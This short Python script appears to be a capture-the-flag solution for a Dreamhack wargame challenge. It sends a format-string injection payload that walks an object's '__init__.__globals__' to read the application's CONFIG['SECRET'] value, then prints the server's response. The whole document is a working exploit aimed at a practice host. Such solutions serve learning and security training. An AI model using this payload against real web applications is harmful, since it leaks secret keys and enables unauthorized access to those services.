import requests
payload = "{config_data.__init__.__globals__['CONFIG']['SECRET']}"
r = requests.get("http://host8.dreamhack.games:11917/", params={"body": payload})
print(r.status_code)
print(r.text)
